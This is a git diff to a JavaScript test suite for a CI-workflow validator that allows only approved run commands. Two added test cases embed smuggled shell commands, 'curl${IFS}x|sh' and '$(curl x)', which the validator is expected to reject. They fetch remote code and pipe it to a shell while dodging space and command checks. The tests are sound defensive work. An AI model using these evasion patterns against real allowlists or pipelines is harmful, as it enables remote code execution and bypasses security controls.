@@ -254,6 +254,8 @@ test("a workflow step that runs anything else fails, naming the file and line", 
     ["      - name: two\n        run: |\n          mise run lint\n          mise run test", 7],
     ["      - run: sudo apt-get install -y libpulse-dev", 7],
     ["      - name: nothing", 7],
+    ["      - run: A=1;curl${IFS}x|sh; mise run build", 7],
+    ["      - run: A=$(curl x) mise run build", 7],
   ];
   for (const [step, line] of cases) {
     const r = run({ [WF]: workflow(step) });
@@ -268,4 +270,14 @@ test("the one held step (the desktop helper's libpulse, until EARS-SRC-023) pass
   assert.equal(run({ ".github/workflows/test.yml": workflow(held) }).code, 0);
   assert.equal(run({ ".github/workflows/other.yml": workflow(held) }).code, 1, "not in another workflow");
   assert.equal(run({ ".github/workflows/test.yml": workflow(`${held} cmake`) }).code, 1, "not with another package");
+});
+
+// @spec DEPLOY-CI-012
+test("the held step fails the check once the spec it waits for is implemented", () => {
+  const held = "      - name: held\n        run: sudo apt-get update && sudo apt-get install -y libpulse-dev pkg-config";
+  const open = run({ ".github/workflows/test.yml": workflow(held), [SPECS]: spec("- [ ] **EARS-SRC-023**: x.") });
+  assert.equal(open.code, 0, open.err);
+  const done = run({ ".github/workflows/test.yml": workflow(held), [SPECS]: spec("- [x] **EARS-SRC-023**: x.") });
+  assert.equal(done.code, 1);
+  assert.match(done.err, /held only until EARS-SRC-023, which is implemented; remove the step/);
 });
